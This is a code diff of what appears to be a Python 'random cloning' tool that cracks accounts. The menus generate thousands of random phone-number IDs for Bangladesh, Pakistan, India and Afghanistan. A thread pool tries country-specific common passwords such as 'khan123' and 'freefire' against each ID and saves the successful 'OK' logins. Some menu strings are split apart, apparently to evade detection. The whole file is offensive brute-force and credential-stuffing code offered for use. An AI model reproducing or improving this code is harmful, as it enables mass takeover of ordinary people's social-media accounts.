@@ -412,325 +412,190 @@ def creation(uid):
     return younisxyz
 
 #---------------------[MAIN MENU]---------------------#
-def RANDOM_MENU():
-    clear()
-    print(f"{P}[{H}â€¢{P}] TODAY DATE :  {F} {date}")
-    line()
-    print(f"{N}[{H}âž¤{N}] COUNTRY :{H} {loc}") 
-    print(f"{N}[{H}âž¤{N}] REGION  :{H} {regi}") 
-    print(f"{N}[{H}âž¤{N}] NETWORK :{H} {network} ") 
-    print(f"{N}[{H}âž¤{N}] YOUR IP :{H} {ip}") 
-    line()
-    print(f"{N}[{R}01{N}]{P} Random Number Cloning") 
-    print(f"{N}[{R}02{N}]{P} Check Result")
-    print(f"{N}[{R}00{N}]{P} Contact Developer")
-    line()
-    helloxyz = input(f"{N}[{B}f{N}]{P} CHOOSE : ")
-    if helloxyz in ["1","01"]:
-    	Method_Password()
-    	#YounisXyz_XyzCoder()
-    if helloxyz in ["2","02"]:
-        Check_Result()
-    elif helloxyz in ["0","00"]:
-        os.system("xdg-open https://www.facebook.com/xyzhackers")
-        RANDOM_MENU()
-    else:
-        print('\033[1;31mPlease Select Valid Option .... ');RANDOM_MENU()
-
-
-#
-def Check_Result():
-	clear()
-	print(f"{N}[{R}01{N}] Check Result {H}OK") 
-	print(f"{N}[{R}02{N}] Check Result {Y}CP")
-	print(f"{N}[{R}00{N}] Back to menu") 
-	line()
-	xyzresult = input(f"Select option : ")
-	if xyzresult in ["", " "]:
-		print("\nDonot empty! ");time.sleep(2);Check_Result()
-	elif xyzresult in ["1", "01"]:
-		try: zyx = open("/sdcard/ROMEO/OK.txt","r").readlines()
-		except FileNotFoundError:print(f"{P}\nNo {H}OK {P}Results Found!");time.sleep(3);Check_Result()
-		for xyz in zyx:
-			print(f"\033[1;92m")
-			print(xyz)
-		line()
-		input(f" [ Press Enter To Back ] ")
-		RANDOM_MENU()
-	elif xyzresult in ["2", "02"]:
-		try: zyx = open("/sdcard/ROMEO/CP.txt","r").readlines()
-		except FileNotFoundError:print(f"{P}\nNo {H}OK {P}Results Found!");time.sleep(3);Check_Result()
-		for xyz in zyx:
-			print(f"\033[1;91m")
-			print(xyz)
-		line()
-		input(f" [ Press Enter To Back ] ")
-		RANDOM_MENU()
-	elif xyzresult in ["0", "00"]:
-		RANDOM_MENU()
-	else:print("\nPlease Select Valid Option .... ");time.sleep(2);Check_Result()
-    
-def Method_Password():
-    os.system("clear")
-    print(logo)
-    #try:os.popen('play-audio Voice/PASSWORD.mp3')
-    #except:pass
-    print(f"{N}[{H}01{N}]{P} AUTO PASSWORD")
-    print(f"{N}[{H}02{N}]{P} CHOOSE PASSWORD")
-    line()
-    helloxyz = input(f"{N}[{B}f{N}] CHOOSE : ")
-    if helloxyz in ["1","01"]:
-        YounisXyz_XyzCoder()
-    elif helloxyz in ["2","02"]:
-        Choice_Password()
-    elif helloxyz in ["3","03"]:
-        Ulti()
-    elif helloxyz in ["4","04"]:
-        pass3()
-    else:
-        print('\033[1;31mINCORECT OPTION !!');RANDOM_MENU()
-
-
-
-
-
-###------------------[PAKISTAN CRACK]-----------###
-def YounisXyz_XyzCoder():
-    clear()
- #   try:os.popen('play-audio Voice/INFO.mp3')
-  #  except:pass
-    Info = input(f"{N}[{R}?{N}] Do You Want To Show Device Info ? [{H}y{H}/{R}n{P}]: ")
-    if Info in[""]:
-    	print(f"{P}[{R}!{P}] Donot Empty .... ");time.sleep(3);YounisXyz_XyzCoder()
-    elif Info in["Y","y"]:
-    	Display_info.append("y")
-    elif Info in["N","n"]:
-    	Display_info.append("n")
-    else:
-    	Display_info.append("n")
-    #try:os.popen('play-audio Voice/COOKIE.mp3')
-    #except:pass
-    COOKIE = input(f"{N}[{R}?{N}] Do You Want To Show Cookie ? [{H}y{H}/{R}n{P}]: ")
-    if COOKIE in[""]:
-    	print(f"\n{P}[{R}!{P}] Donot Empty .... ");time.sleep(2);YounisXyz_XyzCoder()
-    elif COOKIE in["Y","y"]:
-    	Cookie.append("y")
-    elif COOKIE in["N","n"]:
-    	Cookie.append("n")
-    else:
-    	print(f"\n{P}[{R}!{P}] Please Select Between y/n .... ");time.sleep(3);YounisXyz_XyzCoder()
-    #try:os.popen('play-audio Voice/CP.mp3')
-   # except:pass
-    Checkpoint = input(f"{N}[{R}?{N}] Do You Want To Show CP ids ? [{H}y{H}/{R}n{P}]: ")
-    if Checkpoint in[""]:
-    	print(f"{P}[{R}!{P}] Donot Empty .... ");time.sleep(2);YounisXyz_XyzCoder()
-    elif Checkpoint in["Y","y"]:
-    	Cp.append("y")
-    elif Checkpoint in["N","n"]:
-    	Cp.append("n")
-    else:
-    	Cp.append("y")
-    #try:os.popen('play-audio Voice/APPS.mp3')
-    #except:pass
-    #Apps = input(f"{N}[{R}?{N}] Do You Want To Show Related Apps ? [{H}y{H}/{R}n{P}]: ")
-   # if Apps in[""]:
-    	#print(f"\n{P}[{R}!{P}] Donot Empty .... ");time.sleep(3);YounisXyz_XyzCoder()
-  #  elif Apps in["Y","y"]:
-    #	Apk.append("y")
-   # elif Apps in["N","n"]:
-    	#Apk.append("n")
-    #else:
-    #	print(f"\n{P}[{R}!{P}] Please Select Between y/n .... ");time.sleep(2);YounisXyz_XyzCoder()
-    line()
-    print(f"{F}\t~ PASSWORD MENU ~") 
-    line()
-    print(f'''\t\033[1;97m[\x1b[1;99m\x1b[1;41m READ CAREFULLY \x1b[0m\033[1;97m]''')
-    print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}") 
-    print(f"{N}[{R}01{N}]{P} AUTO PASS 7 DIGITS         {N}[{H}ALL COUNTRY{N}]")
-    print(f"{N}[{R}02{N}]{P} AUTO PASS 7 AND 11 DIGITS  {N}[{H}ALL COUNTRY{N}]")
-    print(f"{N}[{R}03{N}]{P} AUTO ULTIMATE PASS {H}FOR PAKISTAN")
-    print(f"{N}[{R}04{N}]{P} AUTO ULTIMATE PASS {pink}FOR INDIA")
-    print(f"{N}[{R}05{N}]{P} AUTO ULTIMATE PASS {Brown}FOR BANGLADESH")
-    print(f"{N}[{R}06{N}]{P} AUTO ULTIMATE PASS {B}AFGHANISTAN")
-    print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}") 
-    print(f"{P}[{R}!{P}] type '\033[1;92mpak\033[0;97m' for see pak country password or type '\033[1;92mind\033[0;97m' for see indion password or type '\033[1;92mbd\033[0;97m' for see bangladesh password or type '\033[1;92mafg\033[0;97m' for see AFG password")
-    pxc = input(f'{N}[{B}f{N}] CHOOSE : ')
-    if pxc in ['Pak','pak']:
-    	line();print(f"{Pakistan}") 
-    	line();input(" [ Press Enter to Back ] ");YounisXyz_XyzCoder()
-    if pxc in ['Ind','ind']:
-    	linex();print(f"{India}") 
-    	line();input(" [ Press Enter to Back ] ");YounisXyz_XyzCoder()
-    if pxc in ['bd','Bd','BD']:
-    	line();print(f"{Bangladesh}") 
-    	line();input(" [ Press Enter to Back ] ");YounisXyz_XyzCoder()
-    if pxc in ['afg','Afg','AFG']:
-    	line();print(f"{Afghanistan}") 
-    	line();input(" [ Press Enter to Back ] ");YounisXyz_XyzCoder()
-    line()
-    print(f"{P}\tAny Input Your Country Sim Code {H}>>>") 
-    line()
-    print(f'''\t\033[1;97m[\x1b[1;99m\x1b[1;42m CODE EXAMPLE ðŸ” \x1b[0m\033[1;97m]''')
-    print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}") 
-    print(f"{N}[{H}EX PAKISTAN CODE{N}]: 0300,0302,0310,0312,0333,0341")
-    print(f"{N}[{pink}EX INDIA CODE{N}]: +91630,91766,91941,91981,91962,91809,91745")
-    print(f"{N}[{Brown}EX BANGLADESH CODE{N}]: 88013,88014,88015,88016,88017,88018,88019")
-    print(f"{N}[{B}EX AFGHANISTAN CODE{N}]: 9378, 9370, 9376, 9373, 9379")
-    print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}") 
-    code = input(f'{N}[{B}f{N}] PUT CODE : ')
-    os.system("clear")
-    print(logo)
-    print(f"{N}[{B}f{N}] For Example : 1000, 2000, 5000, 10000")
-    limit = int(input(f'{N}[{R}?{N}] How Many Numbers Do You Want To Add ? :{H} '))
-    for nmp in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    with ThreadPool(max_workers=30) as XYZCODERS:    
+def randommenu():
+    global lim
+    clear();__durmagi__();verify();iamcheckingyou()
+    print(f"{G1}[{R}A{G1}]{X}_{Y}_{Z}>{G1} AUT"+"O PASS"+f"WORD             {G1}[{Y}BE"+f"ST{G1}]")
+    print(f"{G2}[{R}B{G2}]{X}_{Y}_{Z}>{G2} CUS"+"TOM PASSW"+f"ORD            {G2}[{Y}NE"+f"W{G2}]")
+    print(f"{G3}[{R}C{G3}]{X}_{Y}_{Z}>{G3} M"+"AIN ME"+f"NU                 {G3}[{Y}BA"+f"CK{G3}]")
+    _________linex_________()
+    ________random________ = input(f"{style}{G4} CHOOSE {RE}●{G4} ")
+    if ________random________ in ["", " "]:wash("xdg-open https"+"://www.fa"+"cebook.com/pro"+"file.php?id=10000"+"7169071530");randommenu()
+    elif ________random________ in ["A","a","1","One"]:Random()
+    elif ________random________ in ["B","b","2","Two"]:___ChoicePass___()
+    elif ________random________ in ["C","c","3","Three"]:___R_E_F_A_T___()
+    else:print(f'{style} Select Valid Option');time.sleep(2);randommenu()
+"""-------------------------(RANDOM MENU)-------------------------"""
+def Random():
+    global lim
+    clear();__durmagi__();verify();iamcheckingyou()
+    print(f"{G}[{R}A{G}]{X}_{Y}_{Z}>{G} BANGL"+"ADESH CRAC"+"KING")
+    print(f"{G1}[{R}B{G1}]{X}_{Y}_{Z}>{G1} PAKIS"+"TAN CRAC"+"KING")
+    print(f"{G2}[{R}C{G2}]{X}_{Y}_{Z}>{G2} IND"+"IA CRA"+"CKING")
+    print(f"{G3}[{R}0{G3}]{X}_{Y}_{Z}>{G3} BA"+"CK SYS"+"TEM")
+    _________linex_________()
+    _________rnd_________ = input(f"{style}{G4} CHO"+f"OSE {RE}●{G4} ")
+    if _________rnd_________ in ["", " "]:wash("xdg-open https"+"://www.fa"+"cebook.com/"+"profile.php?id=10000"+"7169071530");___R_E_F_A_T___()
+    elif _________rnd_________ in ["A","a","1","One"]:___Bangladesh___()
+    elif _________rnd_________ in ["B","b","2","Two"]:___Pakistan___()
+    elif _________rnd_________ in ["C","c","3","Three"]:___India___()
+    elif _________rnd_________ in ["0","o","O","Exit"]:randommenu()
+    else:print(f'{style} SELECT VALID OPTION.......!');time.sleep(2);Random()
+"""-------------------------(CUSTOM PASS)-------------------------"""
+def ___ChoicePass___():
+    global lim
+    clear();__durmagi__();verify();iamcheckingyou()
+    print(f"{L}[\033[01m\033[94;1m\033[47m ENTER YOUR SIM FIRST FOUR DIGIT CODE\033[40m{L}]")
+    _________linex_________()
+    print(f"{style} EXA"+f"MPLE BD  {RE}●{G} +880"+"161,+880"+"172,+8801"+"83")
+    print(f"{style} EXA"+f"MPLE PK  {RE}●{G} +920"+"30,+92"+"031,+92"+"033")
+    print(f"{style} EXAM"+f"PLE IN  {RE}●{G} +91"+"620 +91"+"639 +919"+"50")
+    _________linex_________()
+    kode = input(f'{style} CHOOSE CODE {RE}●{G} ')
+    try:
         clear()
-        tl = str(len(user))
-        
-        if "y" in Display_info:
-        	jalan(f"{P}[{H}â€¢{P}] TODAY DATE :  {F} {date}")
-        	line()
-        	jalan(f"{N}[{H}â€¢{N}] COUNTRY :{H} {loc}") 
-        	jalan(f"{N}[{H}â€¢{N}] REGION  :{H} {regi}") 
-        	jalan(f"{N}[{H}â€¢{N}] NETWORK :{H} {network} ") 
-        	jalan(f"{N}[{H}â€¢{N}] YOUR IP :{H} {ip}");line()
-        print(f"{N}[{H}âž¤{N}]{H} OPERATOR  {Brown}â”€âž¤{N} "+code+f"{H} TOTAL IDs {Brown}â”€âž¤{N} "+tl+" ")
-        print(f"{N}[{H}âž¤{N}] TODAY DATE & TIME :{R} {day}/{month}/{year} {Brown}â”€âž¤ {H} "+str(x)+":"+str(lt()[4])+" "+ tag+" ")
-        print(f"{N}[{H}âž¤{N}]{Brown} If No Result {N}[{H}ON{N}/{R}OFF{N}]{Brown} Airplane Mode")
-        print(f"{N}[{H}âž¤{N}] Your {H}OK{N}/{Y}CP {N}IDs Save In {H}> {N}/sdcard/ROMEO")
-        line()
-        for xyzcoderz in user:
-            uid = code+xyzcoderz
-            if pxc in ['1','01']:
-            	pwx = [xyzcoderz,]
-            elif pxc in ['2','02']:
-            	pwx = [xyzcoderz,uid]
-            elif pxc in ['3','03']:
-            	pwx = [xyzcoderz,uid,'khan1122','i love you','khankhan','khan123','khan786','baloch']
-            elif pxc in ['4','04']:
-            	pwx = [xyzcoderz,uid,'free fire','i love you','freefire','57272300','59039200']
-            elif pxc in ['5','05']:
-            	pwx = [xyzcoderz,uid,'free fire','i love you','freefire','bangladesh','Bangladesh']
-            elif pxc in ['6','06']:
-            	pwx = [xyzcoderz,uid,'free fire','i love you','freefire','khan1122','khan123','khankhan','Afghan123','afghanistan','100200','kabul123']
-            else:
-            	pwx = [xyzcoderz,uid,'khan1122','i love you','khankhan','khan123','khan786','baloch']
-            XYZCODERS.submit(YounisXyz,uid,pwx,tl)
-    print()
-    print(f"{H}<{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{H}>") 
-    print(f'{N}[{H}â€¢{N}] CLONING COMPLETED')
-    print(f'{P}[{H}â€¢{P}] TOTAL {H}OK {P}IDS :{H} '+str(len(ok))+'')
-    print(f'{P}[{H}â€¢{P}] TOTAL {Y}CP {P}IDS :{Brown} '+str(len(cp))+'')
-    print(f"{H}<{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{H}>") 
-    input(f'{P}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");RANDOM_MENU()
-
-
-#----------------------[CHOOSE PASSWORD]----------------#
-def Choice_Password():
-    user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
-    clear()
- #   try:os.popen('play-audio Voice/INFO.mp3')
-  #  except:pass
-    Info = input(f"{N}[{R}?{N}] Do You Want To Show Device Info ? [{H}y{H}/{R}n{P}]: ")
-    if Info in[""]:
-    	print(f"{P}[{R}!{P}] Donot Empty .... ");time.sleep(3);YounisXyz_XyzCoder()
-    elif Info in["Y","y"]:
-    	Display_info.append("y")
-    elif Info in["N","n"]:
-    	Display_info.append("n")
-    else:
-    	Display_info.append("n")
-    #try:os.popen('play-audio Voice/COOKIE.mp3')
-    #except:pass
-    COOKIE = input(f"{N}[{R}?{N}] Do You Want To Show Cookie ? [{H}y{H}/{R}n{P}]: ")
-    if COOKIE in[""]:
-    	print(f"\n{P}[{R}!{P}] Donot Empty .... ");time.sleep(2);YounisXyz_XyzCoder()
-    elif COOKIE in["Y","y"]:
-    	Cookie.append("y")
-    elif COOKIE in["N","n"]:
-    	Cookie.append("n")
-    else:
-    	print(f"\n{P}[{R}!{P}] Please Select Between y/n .... ");time.sleep(3);YounisXyz_XyzCoder()
-    #try:os.popen('play-audio Voice/CP.mp3')
-   # except:pass
-    Checkpoint = input(f"{N}[{R}?{N}] Do You Want To Show CP ids ? [{H}y{H}/{R}n{P}]: ")
-    if Checkpoint in[""]:
-    	print(f"{P}[{R}!{P}] Donot Empty .... ");time.sleep(2);YounisXyz_XyzCoder()
-    elif Checkpoint in["Y","y"]:
-    	Cp.append("y")
-    elif Checkpoint in["N","n"]:
-    	Cp.append("n")
-    else:
-    	Cp.append("y")
-    #try:os.popen('play-audio Voice/APPS.mp3')
-    #except:pass
-    #Apps = input(f"{N}[{R}?{N}] Do You Want To Show Related Apps ? [{H}y{H}/{R}n{P}]: ")
-   # if Apps in[""]:
-    	#print(f"\n{P}[{R}!{P}] Donot Empty .... ");time.sleep(3);YounisXyz_XyzCoder()
-  #  elif Apps in["Y","y"]:
-    #	Apk.append("y")
-   # elif Apps in["N","n"]:
-    	#Apk.append("n")
-    #else:
-    #	print(f"\n{P}[{R}!{P}] Please Select Between y/n .... ");time.sleep(2);YounisXyz_XyzCoder()
-    line()
-    print(f"{P}\tAny Input Your Country Sim Code {H}>>>") 
-    line()
-    print(f'''\t\033[1;97m[\x1b[1;99m\x1b[1;42m CODE EXAMPLE ðŸ” \x1b[0m\033[1;97m]''')
-    print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}") 
-    print(f"{N}[{H}EX PAKISTAN CODE{N}]: 0300,0302,0310,0312,0333,0341")
-    print(f"{N}[{pink}EX INDIA CODE{N}]: 91766,91941,91981,91962,91809,91745")
-    print(f"{N}[{Brown}EX BANGLADESH CODE{N}]: 88013,88014,88015,88016,88017,88018,88019")
-    print(f"{N}[{B}EX AFGHANISTAN CODE{N}]: 9378, 9370, 9376, 9373, 9379")
-    print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}") 
-    code = input(f'{N}[{B}f{N}] PUT CODE : ')
-    print(f"{N}[{H}âž¤{N}]{P} For Example : 1000, 2000, 5000, 10000")
-    limit = int(input(f'{N}[{B}f{N}] How Many Numbers Do You Want To Add ? :{H} '))
+        print(f'{style} EXAMPLE     {RE}●{G} 3000 5000 10000')
+        _________linex_________()
+        limit = int(input(f'{style} CRACK LIMIT {RE}●{G} '))
+    except ValueError:
+        limit = 5000
+    lim=limit
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    passx = int(input(f"{N}[{R}?{N}] How Many Password Do You Want To Add ? : ")) 
-    print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}") ;print(f'''\t\033[1;97m[\x1b[1;99m\x1b[1;41m PASSWORD EXAMPLE \x1b[0m\033[1;97m]''');print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}");print(f"{N}[{R}PAKISTAN{N}]{H} khan1122,i love you,khankhan,khan123,khan786,baloch");print(f"{N}[{R}INDIA{N}]{pink} free fire,freefire,i love you,57272300,59039200");print(f"{N}[{R}BANGLADESH{N}]{Brown} free fire,freefirei love you,Bangladesh,bangladesh");print(f"{N}[{R}AFGHANISTAN{N}]{B} free fire,freefire,i love you,khankhan,khan123,khan1122,Afghan123,Afghanistan,100200,kabul123");print(f"{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}");print(f"{N}[{R}!{N}]{Brown} Enter The Password As Your Choice")
-    YounisXYZ = []
-    for younis in range(passx):
-        pww = input(f"{N}[{H}âž¤{N}]{P} Enter Password : ")
-        YounisXYZ.append(pww)
-    with ThreadPool(max_workers=50) as XYZCODERS:
-        tl = str(len(user))
+    clear()
+    try:
+        print(f"{style} EXAMPLE     {RE}●{G} 102030,Bangladesh,etc ")
+        print(f"{style} EXAMPLE     {RE}●{G} 59039200,57273200,etc ")
+        print(f"{style} EXAMPLE     {RE}●{G} khan123,khankhan,.etc")
+        _________linex_________()
+        passx = int(input(f"{style} PASS LIMIT  {RE}●{G} "))
+    except:
+        passx = 2
+    Hossain = []
+    _________linex_________()
+    for shahriar in range(passx):
+        passw = input(f"{G}[{RE}{shahriar+1}{G}] PASSWORD    {RE}●{G} ")
+        _________linex_________()
+        Hossain.append(passw)
+    clear()
+    print(f'{G}[{R}A{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}1{U}){Y}>{G}] {V}[{Q} Robi \033[38;5;45m+\033[38;5;43m Airtel \033[38;5;41m] ')
+    print(f'{G}[{R}B{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}2{U}){Y}>{G}] {V}[{Q} Gp \033[38;5;45m+\033[38;5;43m Bl \033[38;5;41m] ')
+    print(f'{G}[{R}C{G}]{X}_{Y}_{Z}>{G} BACK')
+    _________linex_________()
+    topfire = input(f"{style} SELECT METHOD : ")
+    with refatshahriar(max_workers=30) as Refat:
         clear()
-        if "y" in Display_info:
-        	jalan(f"{P}[{H}â€¢{P}] TODAY DATE :  {F} {date}")
-        	line()
-        	jalan(f"{N}[{H}â€¢{N}] COUNTRY :{H} {loc}") 
-        	jalan(f"{N}[{H}â€¢{N}] REGION  :{H} {regi}") 
-        	jalan(f"{N}[{H}â€¢{N}] NETWORK :{H} {network} ") 
-        	jalan(f"{N}[{H}â€¢{N}] YOUR IP :{H} {ip}");line()
-        print(f"{N}[{H}âž¤{N}]{H} OPERATOR  {Brown}â”€âž¤{N} "+code+f"{H} TOTAL IDs {Brown}â”€âž¤{N} "+tl+" ")
-        print(f"{N}[{H}âž¤{N}] TODAY DATE & TIME :{R} {day}/{month}/{year} {Brown}â”€âž¤ {H} "+str(x)+":"+str(lt()[4])+" "+ tag+" ")
-        print(f"{N}[{H}âž¤{N}]{Brown} If No Result {N}[{H}ON{N}/{R}OFF{N}]{Brown} Airplane Mode")
-        print(f"{N}[{H}âž¤{N}] Your {H}OK{N}/{Y}CP {N}IDs Save In {H}> {N}/sdcard/ROMEO")
-        line()
-        for xyzcoderz in user:
-            #pwx = [xyzcoderz[1:]]
-            uid = code+xyzcoderz
-            pwx = [xyzcoderz,uid]
-            for Alina in YounisXYZ:
-                pwx.append(Alina)
-            XYZCODERS.submit(YounisXyz,uid,pwx,tl)
-    print()
-    print(f"{H}<{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{H}>") 
-    print(f'{N}[{H}â€¢{N}] CLONING COMPLETED')
-    print(f'{P}[{H}â€¢{P}] TOTAL {H}OK {P}IDS :{H} '+str(len(ok))+'')
-    print(f'{P}[{H}â€¢{P}] TOTAL {Y}CP {P}IDS :{Brown} '+str(len(cp))+'')
-    print(f"{H}<{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{H}>") 
-    input(f'{P}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");RANDOM_MENU()
-
-    
+        tl = str(len(user))
+        print(f"{style} TOTAL ID    {RE}●{G} {tl}")
+        print(f"{style} SELECT CODE {RE}●{G} {kode}")
+        print(f"{style} IF ID NOTE COME {W}[{R}ON{W}/{G}OFF{W}]{G} AIRPLANE ")
+        _________linex_________()
+        for psx in user:
+            passlist = [psx[1:]]
+            ___Main_Uid___ = kode+psx
+            for Fahad in Hossain:
+                passlist.append(Fahad)
+                if topfire in ["A","a","1","One"]:Refat.submit(___TopRndm1___,___Main_Uid___,passlist,tl)
+                elif topfire in ["B","b","2","Two"]:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
+                elif topfire in ["C","c","3","Three"]:Random()
+                else:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
+    print("")
+    _________linex_________()
+    print(f'{style} RANDOM CRACKING HAS BEEN COMPLETE....!')
+    print(f'{style}{G} YOUR TOTAL [OK-IDS] {RE}●{G} [{str(len(oks))}]')
+    _________linex_________()
+    input(f"{style} PRESS ENTER TO BACK ORIGINAL MENU....!");___R_E_F_A_T___()
+"""-------------------------(BD CRACKING)-------------------------"""
+def ___Bangladesh___():
+    global lim
+    clear();__durmagi__();verify();iamcheckingyou()
+    print(f'{style} EXAMPLE     {RE}●{G} 016 017 018 019')
+    _________linex_________()
+    kode = input(f'{style} CHOOSE CODE {RE}●{G} ')
+    try:
+        clear()
+        print(f'{style} EXAMPLE     {RE}●{G} 3000 , 5000 , 10000')
+        _________linex_________()
+        limit = int(input(f'{style} CRACK LIMIT {RE}●{G} '))
+    except ValueError:
+        limit = 5000
+    lim=limit
+    for nmbr in range(limit):
+        koda = ''.join(random.choice(string.digits) for _ in range(2))
+        kodb = ''.join(random.choice(string.digits) for _ in range(2))
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        user.append(nmp)
+    clear()
+    print(f'{G}[{R}A{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}1{U}){Y}>{G}] {V}[{Q} Robi \033[38;5;45m+\033[38;5;43m Airtel \033[38;5;41m] ')
+    print(f'{G}[{R}B{G}]{X}_{Y}_{Z}>{G} METHOD {G}[{Y}<{U}({B}2{U}){Y}>{G}] {V}[{Q} Gp \033[38;5;45m+\033[38;5;43m Bl \033[38;5;41m] ')
+    print(f'{G}[{R}C{G}]{X}_{Y}_{Z}>{G} BACK')
+    _________linex_________()
+    topfire = input(f"{style} SELECT METHOD : ")
+    with refatshahriar(max_workers=30) as Refat:
+        clear()
+        tl = str(len(user))
+        print(f"{style} TOTAL ID    {RE}●{G} {tl}")
+        print(f"{style} SELECT CODE {RE}●{G} {kode}")
+        print(f"{style} IF ID NOTE COME {W}[{R}ON{W}/{G}OFF{W}]{G} AIRPLANE ")
+        _________linex_________()
+        for psx in user:
+            ___Main_Uid___ = kode+koda+kodb+psx
+            passlist = [koda+kodb+psx,kodb+psx,kode+koda+kodb,kode+kode,'১২৩৪৫৬']
+            if topfire in ["A","a","1","One"]:Refat.submit(___TopRndm1___,___Main_Uid___,passlist,tl)
+            elif topfire in ["B","b","2","Two"]:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
+            elif topfire in ["C","c","3","Three"]:Random()
+            else:Refat.submit(___TopRndm2___,___Main_Uid___,passlist,tl)
+    print("")
+    _________linex_________()
+    print(f'{style} RANDOM CRACKING HAS BEEN COMPLETE....!')
+    print(f'{style}{G} YOUR TOTAL [OK-IDS] {RE}●{G} [{str(len(oks))}]')
+    _________linex_________()
+    input(f"{style} PRESS ENTER TO BACK ORIGINAL MENU....!");___R_E_F_A_T___()
+"""-------------------------(PAK CRACKING)-------------------------"""
+def ___Pakistan___():
+    global lim
+    clear();__durmagi__();verify();iamcheckingyou()
+    print(f'{style} EXAMPLE     {RE}●{G} 0306 0315 0335 0345')
+    _________linex_________()
+    kode = input(f'{style} CHOOSE CODE {RE}●{G} ')
+    try:
+        clear()
+        print(f'{style} EXAMPLE     {RE}●{G} 3000 5000 10000')
+        _________linex_________()
+        limit = int(input(f'{style} CRACK LIMIT {RE}●{G} '))
+    except ValueError:
+        limit = 5000
+    lim=limit
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    clear()
